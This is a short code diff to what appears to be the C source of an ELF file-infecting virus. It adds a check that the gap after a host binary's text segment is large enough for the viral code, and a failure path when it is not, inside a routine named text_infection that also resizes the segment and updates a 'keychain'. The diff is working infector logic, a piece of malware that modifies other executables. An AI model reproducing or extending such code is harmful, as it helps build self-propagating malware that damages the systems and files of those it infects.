@@ -29,6 +29,11 @@ __attribute__((always_inline)) static inline void update_text_segment(Elf64_Phdr
 	segment->p_memsz += (void *)__exit - (void *)L1;
 }
 
+__attribute__((always_inline)) static inline bool is_enough_place(const Elf64_Phdr *segment1, const Elf64_Phdr *segment2)
+{
+	return segment2->p_offset - (segment1->p_offset + segment1->p_filesz) > (size_t)((void *)__exit - (void *)L1);
+}
+
 ////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
@@ -57,7 +62,14 @@ void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_con
 		if (host->segment[TEXT] != NULL)
 			segment->p_offset += PAGE_SIZE;
 		if (is_text_segment(segment) == true)
+		{
 			host->segment[TEXT] = segment;
+			if (is_enough_place(segment, segment + 1) == false)
+			{
+				context = FAILURE;
+				goto label;
+			}
+		}
 	}
 
 	if (segment == NULL)
@@ -67,7 +79,6 @@ void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_con
 	}
 
 	update_text_segment(host->segment[TEXT]);
-
 
 label:
 	update_keychain_right(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
